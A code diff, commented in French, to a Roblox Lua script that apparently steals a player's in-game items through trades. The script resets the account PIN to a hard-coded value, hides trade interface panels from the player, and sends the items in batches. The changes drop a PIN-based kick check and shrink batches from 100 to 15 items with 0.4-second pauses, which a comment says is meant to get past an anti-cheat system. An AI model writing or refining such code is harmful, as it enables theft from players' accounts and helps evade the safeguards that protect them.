@@ -43,19 +43,16 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
--- // SECTION PIN CORRIGÉE : Le script ne kick plus si un PIN est présent
+-- // SECTION PIN CORRIGÉE : Plus de kick automatique
 local args = {
     [1] = {
         ["option"] = "PIN",
         ["value"] = "9079"
     }
 }
--- On garde l'appel au serveur pour la forme, mais on retire la condition de kick
 pcall(function()
     netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
 end)
-
--- L'ancienne vérification qui causait l'erreur "Account error" a été supprimée.
 
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
@@ -404,9 +401,12 @@ if #itemsToSend > 0 then
                 wait(0.5)
             until inTrade
 
-            local currentBatch = getNextBatch(itemsToSend, 100)
+            -- MODIFICATION : Lots de 15 items au lieu de 100
+            local currentBatch = getNextBatch(itemsToSend, 15) 
             for _, item in ipairs(currentBatch) do
                 addItemToTrade(item.itemType, item.ItemID)
+                -- MODIFICATION : Pause de 0.4s entre chaque objet pour le BAC
+                task.wait(0.4) 
             end
 
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
